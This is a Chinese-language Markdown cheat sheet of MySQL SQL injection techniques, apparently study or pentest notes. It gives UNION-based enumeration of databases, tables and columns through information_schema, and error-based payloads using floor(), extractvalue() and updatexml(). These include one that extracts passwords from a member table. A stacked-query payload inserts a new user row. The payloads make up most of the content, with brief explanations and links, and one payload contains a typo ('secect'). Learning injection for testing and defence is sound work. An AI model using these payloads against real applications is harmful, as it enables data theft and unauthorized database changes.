# 回显注入法 -- 能在页面直接显示结果
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x01 UNION联合查询
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理: 通过 union 操作符，合并两个或者多个select语句的结果集
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;union内部的select语句必须拥有**相同数量的列**，列的数据类型必须相似，列的顺序也必须相同
![](/assets/WX20190221-152225@2x.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: union注入法前提要**知道列数**和**页面能回显**
```sql
确定列数: order by NUM，NUM采用二分方法加快查询速度，NUM回显报错就说明超过列数
显示位置: 参数 union select num1，num2，..,NUM，参数要强制报错，才能显示返回数据的位置
查询库: union select num1,group_concat(schema_name) from information_schema.schemata
查询表: union select num1,group_concat(table_name) from information_schema.tables where table_schema=database()
查询列: union select num1,group_concat(column_name) from information_schema.columns where table_name='表名'(注1)
查数据: union select num1,concat_ws(0x7e,列名,列名) from 库名.表名

注意点: 1.表名加引号,推荐改为十六进制(hex),记得添加 0x。

```
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x02 报错查询
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理: 构造payload让信息通过错误提示回显出来
![](/assets/F959A1FB7211CB335A3944DE5CBA4FF1.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: 经典报错函数（结合Burpsuite快速获取内容）
![](/assets/2DA57441F54D5F917232F998ACD62900.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: [floor()](https://blog.csdn.net/liangdongjuan/article/details/78406395)
```sql
and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))) %23
select version()可替换 select table_name from information_schema.tables where table_schema=database() limit 0,1

因为存在长度限制问题，采用substr()函数进行切割
and (extractvalue(1,concat(0x7e,(select substr(password,1,31) from stormgroup.member limit 1,1),0x7e)))
```
![](/assets/7DF1248C5FA74AA8624787ECEBB8C368.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: and extractvalue(1, payload)
```sql
and extractvalue(1, concat(0x7e,(select @@version),0x7e)) and updatexml(1,concat(0x23,(select table_name from
information_schema.tables where table_schema='newblog' limit 0,1),0x23),1)
```
![](/assets/22F086091F949BB64B59D97865EFE310.png)
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payload: and updatexml(1,payload,1)
```sql
    and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)
```
![](/assets/26024E61529BC7DF606D3641DB676AAB.png)

**注意: [其他报错方式](https://www.waitalone.cn/mysql-error-based-injection.html)、报错返回会有32限制(采用substr(concat(内容),1,2)截取)**
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0x03 堆叠注入
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;原理: 堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行
####&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;方法: 语句用 ; 隔开添加新的执行语句


```
 参数'; insert into users(id,username,password) value (66,'acca','bbc')--+
```


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[堆叠注入实战](https://blog.csdn.net/SouthWind0/article/details/82929895)、[各库堆叠注入](https://www.cnblogs.com/0nth3way/articles/7128189.html)








